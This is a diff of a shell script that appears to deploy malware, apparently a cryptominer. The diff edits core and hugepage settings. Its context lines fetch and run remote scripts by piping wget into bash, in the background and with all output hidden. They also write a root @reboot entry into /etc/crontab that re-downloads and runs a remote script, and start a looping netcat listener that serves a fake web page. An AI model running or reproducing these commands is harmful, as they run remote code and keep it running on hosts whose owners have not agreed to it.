@@ -28,9 +28,10 @@ if [ "$mode" == "1" ]; then
   bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 12\r\n\r\nHello World" |nc -l -q 1 -p 8080; done') >/dev/null 2>&1 &
   bash <(wget -qO- ${src}/k.sh) 43200 21600 >/dev/null 2>&1 &
   [ "$cores" == "2" ] && cores="1";
+  [ "$cores" == "4" ] && cores="2";
 fi
 
-sudo sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1
+sudo sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1
 sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
 
 
